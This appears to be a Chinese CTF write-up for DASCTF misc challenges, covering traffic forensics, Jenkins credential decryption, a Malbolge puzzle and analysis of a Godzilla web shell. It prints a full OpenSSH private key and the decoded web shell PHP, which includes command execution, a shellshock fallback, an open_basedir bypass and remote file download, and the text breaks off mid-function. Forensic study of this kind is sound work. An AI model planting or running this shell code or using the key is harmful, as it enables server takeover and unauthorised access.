0x01 Misc
=========

月圆之夜
----

搜对照表：`https://www.eso-tw.com/%E5%AE%A1%E5%88%A4%E5%B8%AD%EF%BC%88%E4%BC%AA%EF%BC%89%E7%A7%B0%E5%8F%B7%E6%95%B4%E7%90%86%E9%99%84%E9%AD%94%E6%97%8F%E6%96%87%E5%AD%97%E5%AF%B9%E7%85%A7%E8%A1%A8/`

Hi!Hecker!
----------

打开流量包看看，可以看到上传了一个jenkins\_secret.zip，可以简单推测，main.py的功能是将数据进行发送，可以猜测是把jenkins\_secret.zip发送至了172.17.0.1这个ip，那么想要提取文件直接跟下面的流就行了

![image-20220331093433014](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-79ada5ba053bfffbc45c0e5e5d8cbcfbe63cb2e5.png)

这个流量包的下一个包就可以看见

![image-20220331093802250](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-37c6b87ce70f917bdfd1750458ce9c7df6dd2bd3.png)

把这个流提出来

![image-20220331093933829](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ced1862924623712bca9931c65e99150ec31355a.png)

因为是一个zip包，所以要删掉最开始多余的数据，还有末尾一堆1337133711333377

![image-20220331094033359](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5d552ff23809afa8e09a8c5e94b24326f6a7c91c.png)

但是这里数据应该是分块传输的，比赛的时候只提出了这些，忽略了下面还有一个压缩包数据，里面有用master.key

![image-20220331094419190](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-fd859548f632d87015bdb05141bef9b766bd7b5c.png)

可以看到这里应该拼接接上上一个数据包，这也是为什么直接binwalk也出不来master.key

![image-20220331094624410](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7a58eab5eabd6fef65abff4a25870e04d4175c3d.png)

一共有8个包，seq 1-8，`icmp && icmp.type == 8 && icmp.seq < 9`

![image-20220331095114386](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f0a8a5114834360bba68cebfc8e77f7a26dfdfff.png)

这里为了方便直接用tshark处理了

`tshark -r DASCTF.pcapng -T fields -e data.data -Y "icmp.seq<9 && icmp.type == 8" > 222.txt`

去掉冒号，开头结尾的多余字符，转储解压

![image-20220331100334949](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-16f89659a20f65f109f52fb52e8952e956528ecb.png)

![image-20220331100418519](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bd2bb776b1ddf08fe3c98ac50ea411dfe833e0e0.png)

接下来就是经典找工具环节，找到

`https://github.com/hoto/jenkins-credentials-decryptor`

```php
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
$JENKINS_HOME/jobs/example-folder/config.xml - Possible location
```

跟流量包提出的文件一模一样

`./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c ../credentials.xml -o json`

![image-20220331103842107](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-711125b7b23d076139c8b0c1bdf6ae9f535b16a7.png)

是github的sshkeys

再结合流量中的

![image-20220331121142859](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2c7399b88e1299a22ace2182c06414906963d847.png)

可以判断需要将key手工修补，启动ssh-agent代理，ssh-add添加pem密钥，直接获得账号调用私有库的权限，最后gitclone就行了

修补一下，吧\\n都删掉

```php
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

这里试了一大顿，想起是linux和Windows结尾字符的差别，要转换一下就好了

![image-20220331142620383](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-fc64dce7141cf9beb4dd05fb0ab3eac3ce3b6a70.png)

`git log`看一下提交记录

![image-20220331142944280](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7ae82530f33e64bbab87fd88b55f3e553a7bb89a.png)

一个一个reset，恢复上一个版本`git reset --hard 0084e77948215ec2abd031701ecbca87f1534264`，有了参数--hard,直接把工作区的内容也修改了，不加--hard的时候只是操作了暂存区，不影响工作区的，--hard一步到位，最后恢复出一个source，打开查看

![image-20220331143204856](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-24f9e5ddf72816ae9aad15995809a7de1538e379.png)

什么奇奇怪怪的东西
---------

万能网站查一下，下下来

`https://fileinfo.com/extension/mrf`

![image-20220331144215044](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-970edef960b65eb3a8378cc7707f711391fda050.png)

![image-20220331144241475](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-38418cf0a0618880a807a576047d910211b24a7d.png)

只看down和up中间的那个move轨迹

![image-20220331144330019](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-940a1af7bc41deafe2f8c795e311db90a0cac6d9.png)

都看一下，得到密码`397643258669` ，然后可以解压压缩包，得到一个vhd文件，查了一下7z可以直接解压

得到4个文件，分别有一段神奇编码

![image-20220331144852148](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6ade106a81db8e8ffda7be8bc7e32022b9765090.png)

图片扔winhex，发现是png 89504e47 的倒序

![image-20220331145128690](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d2d445e597724605ba9ff22e2f98c0aeb15864e8.png)

```php
f = open('ZmxhZzQK.png','rb').read()
flag = ''
for i in f:
    flag += str(hex(i)[2:].zfill(2))
print(flag[::-1])
```

保存为新图片

![flag](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3e41e1e378a8bf6d934d334e686ae00b266ac3df.png)

![image-20220331145752362](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b29cd2ff1560556a86e924166c4a289d63ee1c54.png)

访问链接，又是一串字符

![image-20220331145910840](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5a86fe0baf63183fcfbd73ee6735434faa1362a3.png)

很好，卡住了 赛后看wp，发现是个叫Malbolge的语言，我还以为是个什么编码表要继续找东西呢

`https://malbolge.doleczek.pl/`

按照1234的顺序拼起来

```php
'&B$:?8=<;:3W76/4-Qrqponmlkjihgfedcbawv{zyxwvutsl2poQmle+LKJIHGcE[`YX]V[ZSw:
9876543210/.-,+*)E'CB;:?>=<;4Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFED`B^]V[TYXWVUNrLQJONMLKDh+*)('&<A@?8=<;:92Vwvutsrqponmlkjihgfedcba`_^
]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]?[ZYXWVUTSLpPImMLKDh+*)('&<A@?>=<;:92Vw5.32+*N
onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('=BA
@?>=<;:32V65432r0/(Lmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876
543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
GFEDCBA@?>=<;:9876543210/.-,+*)('CBA:?>=<5:981Uv.32+0)Mn,+*)('~Dedcba`_^]\[Z
YXWVUTSRnPfkjihgf_d]#DC_X]\[ZYXWPt76543210/.-,+*)('&<A@?>7<;:981Uvutsrqponml
kjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBAW\[ZYXWPUTSRKoONMFKDhH*FEDCB;_"!~
}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`e^cba`_^]\Uy<;:98765432
10/.-,+*)('&%$#"!~}|{zyxwvutsrqp.-,+*)('&f|dc@a`_^]\[ZYXWVUTSRQPONMLKJIHGFED
CBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWV
UTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjih
gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"!~}|{z
yxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.
-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@
?>=<;:9876543210/.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
QPONMLKJIHGFEDCBA@?>ZSXWVOTSRKPINMFjW
```

![image-20220331150424885](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-96ed3de77a00e93838cc0df447e8cb0df584c0fa.png)

`DASCTF{1_l0v3_m1sc_s0_much!}`

Au5t1n的秘密
---------

打开一看，一堆404，一看就是扫目录流量

![image-20220331151320177](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d9405222b465cd2fb0f2b378ce568bc407307af2.png)

然后像是弱口令进了后台然后上传文件

![image-20220331151648518](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-926a2b7eb6d6306a43a4ad7ed8f89d19d7439c1e.png)

往下翻翻，发现一个key

![image-20220331151802549](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-573dbff73f3e176c14381aa7e4dd377cad05eb08.png)

再翻翻

![image-20220331151734413](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-46f369ce5d889c4f9de816b98dc9b04f65be8b7a.png)

base64解一下

![image-20220331152738280](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1a215fbdcafef6c1c288d4c36fa699cf717e9aa1.png)

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='093c1c388069b7e1';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (stripos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

很明显是哥斯拉的马

可以看到首次连接的时候发了一个特别大的数据包

![image-20220331153644548](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9251abb2ece209f77907dc6998c8bbd2c8128282.png)

将data转字符串然后base64加密一下

![image-20220331154009703](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-70bef17e99809df6ca3a76595f0fe29fe891e8be.png)

解密：

```PHP
<?php

function encode($D,$K){
    for($i=0;$i<strlen($D);$i++){
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass='pass';
$payloadName='payload';
$key='093c1c388069b7e1';
$data = '';
$decode = encode(base64_decode($data),$key);
echo $decode;
```

![image-20220331154442644](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c064ab910b5737d299d42fe1be4a0134fa0f6988.png)

要注意一点是这里断开了，别复制少了

![image-20220331155219159](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7c737d604f14e596a98c53ec7bb0a1a6e916180c.png)

也可以直接导出didi.php

![image-20220331154303141](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d312c7fb20927028bada0c2071f4f41735714ea8.png)

```python
key = '093c1c388069b7e1'
f = open('didi.php','rb').read()
for i in range(len(f)):
    print(chr(f[i] ^ ord(key[i+1&15])),end='')
```

![image-20220331154323029](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-df9496b097fb0ec90cabdd63f0b1264d050ea274.png)

得到原PHP文件

```php
<?php
$parameters=array();
$_SES=array();
function run($pms){
    reDefSystemFunc();
    $_SES=&getSession();
    @session_start();
    $sessioId=md5(session_id());
    if (isset($_SESSION[$sessioId])){
        $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId)));
    }
    @session_write_close();

    if (canCallGzipDecode()==1&&@isGzipStream($pms)){
        $pms=gzdecode($pms);
    }
    formatParameter($pms);

    if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    $result=evalFunc();

    if ($_SES!==null){
        session_start();
        $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId));
        @session_write_close();
    }

    if (canCallGzipEncode()){
        $result=gzencode($result,6);
    }

    return $result;
}
function S1MiwYYr($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $D[$i] = $D[$i]^$K[($i+1)%15];
    }
    return $D;
}
function reDefSystemFunc(){
    if (!function_exists("file_get_contents")) {
        function file_get_contents($file) {
            $f = @fopen($file,"rb");
            $contents = false;
            if ($f) {
                do { $contents .= fgets($f); } while (!feof($f));
            }
            fclose($f);
            return $contents;
        }
    }
    if (!function_exists('gzdecode')&&function_existsEx("gzinflate")) {
        function gzdecode($data)
        {
            return gzinflate(substr($data,10,-8));
        }
    }
}
function &getSession(){
    global $_SES;
    return $_SES;
}
function bypass_open_basedir(){
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    $allFiles = @scandir($_FILENAME);
    $cdStatus=false;
    if ($allFiles!=null){
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                if (@is_dir($fileName)){
                    if (@chdir($fileName)===true){
                        $cdStatus=true;
                        break;
                    }
                }
            }

        }
    }
    if(!@file_exists('bypass_open_basedir')&&!$cdStatus){
        @mkdir('bypass_open_basedir');
    }
    if (!$cdStatus){
        @chdir('bypass_open_basedir');
    }
    @ini_set('open_basedir','..');
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_path = str_replace("\\",'/',$_FILENAME);
    @$_num = substr_count($_path,'/') + 1;
    $_i = 0;
    while($_i < $_num){
        @chdir('..');
        $_i++;
    }
    @ini_set('open_basedir','/');
    if (!$cdStatus){
        @rmdir($_FILENAME.'/'.'bypass_open_basedir');
    }
}
function formatParameter($pms){
    global $parameters;
    $index=0;
    $key=null;
    while (true){
        $q=$pms[$index];
        if (ord($q)==0x02){
            $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]=$value;
            $key=null;
        }else{
            $key.=$q;
        }
        $index++;
        if ($index>strlen($pms)-1){
            break;
        }
    }
}
function evalFunc(){
    try{
        @session_write_close();
        $className=get("codeName");
        $methodName=get("methodName");
        $_SES=&getSession();
        if ($methodName!=null){
            if (strlen(trim($className))>0){
                if ($methodName=="includeCode"){
                    return includeCode();
                }else{
                    if (isset($_SES[$className])){
                        return eval($_SES[$className]);
                    }else{
                        return "{$className} no load";
                    }
                }
            }else{
                if (function_exists($methodName)){
                    return $methodName();
                }else{
                    return "function {$methodName} not exist";
                }
            }
        }else{
            return "methodName Is Null";
        }
    }catch (Exception $e){
        return "ERROR://".$e -> getMessage();
    }

}
function deleteDir($p){
    $m=@dir($p);
    while(@$f=$m->read()){
        $pf=$p."/".$f;
        @chmod($pf,0777);
        if((is_dir($pf))&&($f!=".")&&($f!="..")){
            deleteDir($pf);
            @rmdir($pf);
        }else if (is_file($pf)&&($f!=".")&&($f!="..")){
            @unlink($pf);
        }
    }
    $m->close();
    @chmod($p,0777);
    return @rmdir($p);
}
function deleteFile(){
    $F=get("fileName");
    if(is_dir($F)){
        return deleteDir($F)?"ok":"fail";
    }else{
        return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
    }
}
function setFileAttr(){
    $type = get("type");
    $attr = get("attr");
    $fileName = get("fileName");
    $ret = "Null";
    if ($type!=null&&$attr!=null&&$fileName!=null) {
        if ($type=="fileBasicAttr"){
            if (@chmod($fileName,convertFilePermissions($attr))){
                return "ok";
            }else{
                return "fail";
            }
        }else if ($type=="fileTimeAttr"){
            if (@touch($fileName,$attr)){
                return "ok";
            }else{
                return "fail";
            }
        }else{
            return "no ExcuteType";
        }
    }else{
        $ret="type or attr or fileName is null";
    }
    return $ret;
}
function fileRemoteDown(){
    $url=get("url");
    $saveFile=get("saveFile");
    if ($url!=null&&$saveFile!=null) {
        $data=@file_get_contents($url);
        if ($data!==false){
            if (@file_put_contents($saveFile,$data)!==false){
                @chmod($saveFile,0777);
                return "ok";
            }else{
                return "write fail";
            }
        }else{
            return "read fail";
        }
    }else{
        return "url or saveFile is null";
    }
}
function copyFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (@is_file($srcFileName)){
        if (copy($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    }else{
        return "The target does not exist or is not a file";
    }
}
function moveFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (rename($srcFileName,$destFileName)){
        return "ok";
    }else{
        return "fail";
    }

}
function getBasicsInfo()
{
    $data = array();
    $data['OsInfo'] = @php_uname();
    $data['CurrentUser'] = @get_current_user();
    $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
    $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR'];
    $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT'];
    $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP'];
    $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR'];
    $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['disable_functions'] = @ini_get('disable_functions');
    $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
    $data['Open_basedir'] = @ini_get('open_basedir');
    $data['timezone'] = @ini_get('date.timezone');
    $data['encode'] = @ini_get('exif.encode_unicode');
    $data['extension_dir'] = @ini_get('extension_dir');
    $data['sys_get_temp_dir'] = @sys_get_temp_dir();
    $data['include_path'] = @ini_get('include_path');
    $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];
    $data['PHP_SAPI'] = PHP_SAPI;
    $data['PHP_VERSION'] = PHP_VERSION;
    $data['PHP_INT_SIZE'] = PHP_INT_SIZE;
    $data['canCallGzipDecode'] = canCallGzipDecode();
    $data['canCallGzipEncode'] = canCallGzipEncode();
    $data['session_name'] = @ini_get("session.name");
    $data['session_save_path'] = @ini_get("session.save_path");
    $data['session_save_handler'] = @ini_get("session.save_handler");
    $data['session_serialize_handler'] = @ini_get("session.serialize_handler");
    $data['user_ini_filename'] = @ini_get("user_ini.filename");
    $data['memory_limit'] = @ini_get('memory_limit');
    $data['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $data['post_max_size'] = @ini_get('post_max_size');
    $data['max_execution_time'] = @ini_get('max_execution_time');
    $data['max_input_time'] = @ini_get('max_input_time');
    $data['default_socket_timeout'] = @ini_get('default_socket_timeout');
    $data['mygid'] = @getmygid();
    $data['mypid'] = @getmypid();
    $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
    $data['short_open_tag'] = @get_cfg_var('short_open_tag');
    $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
    $data['asp_tags'] = @get_cfg_var('asp_tags');
    $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
    $data['safe_mode'] = @get_cfg_var('safe_mode');
    $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
    $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
    $SCRIPT_FILENAME=@dirname($_SERVER['SCRIPT_FILENAME']);
    $data['FileRoot'] = '';
    if (substr($SCRIPT_FILENAME, 0, 1) != '/') {foreach (range('A', 'Z') as $L){ if (@is_dir("{$L}:")){ $data['FileRoot'] .= "{$L}:/;";}};};
    $data['FileRoot'] = (strlen(trim($data['FileRoot'])) > 0 ? $data['FileRoot'] : '/');
    $data['FileRoot']= substr_count($data['FileRoot'],substr($SCRIPT_FILENAME, 0, 1))<=0?substr($SCRIPT_FILENAME, 0, 1).":/":$data['FileRoot'];
    $result="";
    foreach($data as $key=>$value){
        $result.=$key." : ".$value."\n";
    }
    return $result;
}
function getFile(){
    $dir=get('dirName');
    $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
    $dir.="/";
    $path=$dir;
    $allFiles = @scandir($path);
    $data="";
    if ($allFiles!=null){
        $data.="ok";
        $data.="\n";
        $data.=$path;
        $data.="\n";
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                $fullPath = $path.$fileName;
                $lineData=array();
                array_push($lineData,$fileName);
                array_push($lineData,@is_file($fullPath)?"1":"0");
                array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath)));
                array_push($lineData,@filesize($fullPath));
                $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                array_push($lineData,(strlen($fr)>0?$fr:"F"));
                $data.=(implode("\t",$lineData)."\n");
            }

        }
    }else{
        return "Path Not Found Or No Permission!";
    }
    return $data;
}
function readFileContent(){
    $fileName=get("fileName");
    if (@is_file($fileName)){
        if (@is_readable($fileName)){
            return file_get_contents($fileName);
        }else{
            return "No Permission!";
        }
    }else{
        return "File Not Found";
    }
}
function uploadFile(){
    $fileName=get("fileName");
    $fileValue=get("fileValue");
    if (@file_put_contents($fileName,$fileValue)!==false){
        @chmod($fileName,0777);
        return "ok";
    }else{
        return "fail";
    }
}
function newDir(){
    $dir=get("dirName");
    if (@mkdir($dir,0777,true)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function newFile(){
    $fileName=get("fileName");
    if (@file_put_contents($fileName,"")!==false){
        return "ok";
    }else{
        return "fail";
    }
}

function function_existsEx($functionName){
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d));
}

function execCommand(){
    @ob_start();
    $cmdLine=get("cmdLine");
    $d=__FILE__;
    $cmdLine=substr($d,0,1)=="/"?"-c \"{$cmdLine}\"":"/c \"{$cmdLine}\"";
    if(substr($d,0,1)=="/"){
        @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }else{
        @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    $executeFile=substr($d,0,1)=="/"?"sh":"cmd";

    $cmdLine="{$executeFile} {$cmdLine}";
    $cmdLine=$cmdLine." 2>&1";
    $ret=0;

    if (!function_exists("runshellshock")){
        function runshellshock($d, $c) {
            if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $tmp = tempnam(sys_get_temp_dir(), 'as');
                    putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                    if (function_existsEx('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    print($output);
                    return True;
                }
            }
            return False;
        };
    }

    if(function_existsEx('system')){
        @system($cmdLine,$ret);
    }elseif(function_existsEx('passthru')){
        @passthru($cmdLine,$ret);
    }elseif(function_existsEx('shell_exec')){
        print(@shell_exec($cmdLine));
    }elseif(function_existsEx('exec')){
        @exec($cmdLine,$o,$ret);
        print(join("\n",$o));
    }elseif(function_existsEx('popen')){
        $fp=@popen($cmdLine,'r');
        while(!@feof($fp)){
            print(@fgets($fp,2048));
        }
        @pclose($fp);
    }elseif(function_existsEx('proc_open')){
        $p = @proc_open($cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while(!@feof($io[1])){
            print(@fgets($io[1],2048));
        }
        while(!@feof($io[2])){
            print(@fgets($io[2],2048));
        }
        @fclose($io[1]);
        @fclose($io[2]);
        @proc_close($p);
    }elseif(runshellshock($d, $cmdLine)) {
        print($ret);
    }elseif(substr($d,0,1)!="/" && @class_exists("COM")){
        $w=new COM('WScript.shell');
        $e=$w->exec($cmdLine);
        $so=$e->StdOut();
        print($so->ReadAll());
        $se=$e->StdErr();
        print($se->ReadAll());
    }else{
        return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock is available";
    }
    print(($ret!=0)?"ret={$ret}":"");
    $result = @ob_get_contents();
    @ob_end_clean();
    return $result;
}
function execSql(){
    $dbType=get("dbType");
    $dbHost=get("dbHost");
    $dbPort=get("dbPort");
    $username=get("dbUsername");
    $password=get("dbPassword");
    $execType=get("execType");
